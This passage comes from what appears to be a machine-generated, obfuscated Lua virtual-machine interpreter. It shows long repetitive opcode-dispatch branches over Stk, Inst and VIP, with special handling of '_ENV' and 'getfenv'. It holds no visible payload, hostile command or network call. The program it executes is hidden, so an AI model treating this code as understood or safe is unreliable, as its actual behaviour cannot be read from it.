              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            else
              local A;
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
            end
          elseif (Enum <= 367) then
            if (Enum <= 364) then
              if (Enum <= 362) then
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
              elseif (Enum > 363) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 365) then
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum == 366) then
              local A = Inst[2];
              local B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
            else
              local B;
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            end
          elseif (Enum <= 370) then
            if (Enum <= 368) then
              local A = Inst[2];
              Stk[A] = Stk[A]();
            elseif (Enum > 369) then
              local A;
              Stk[Inst[2]] = Stk[Inst[3]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              do
                return Stk[A](Unpack(Stk, A + 1, Inst[3]));
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              do
                return Unpack(Stk, A, Top);
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            end
          elseif (Enum <= 372) then
            if (Enum > 371) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
          elseif (Enum == 373) then
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          else
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          end
        elseif (Enum <= 386) then
          if (Enum <= 380) then
            if (Enum <= 377) then
              if (Enum <= 375) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 376) then
                local B;
                local Edx;
                local Results, Limit;
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                VIP = Inst[3];
              else
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
              end
            elseif (Enum <= 378) then
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum > 379) then
              local A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
            else
              Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
            end
          elseif (Enum <= 383) then
            if (Enum <= 381) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum > 382) then
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = {};
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
            else
              local Edx;
              local Results, Limit;
              local B;
              local A;
